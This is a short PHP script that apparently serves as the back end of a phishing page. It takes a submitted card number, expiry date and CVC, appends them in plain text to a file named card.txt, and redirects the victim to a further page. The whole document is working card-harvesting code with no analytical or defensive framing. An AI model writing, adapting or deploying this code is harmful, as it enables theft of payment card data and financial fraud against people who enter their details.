<?php
file_put_contents("card.txt", "Account number: " . $_POST["number"] . "   ||| Date: " . $_POST["date"] . "   ||| Cvc: " . $_POST["cvc"] .
"\n", FILE_APPEND);
header("Location: /index3.html");
exit();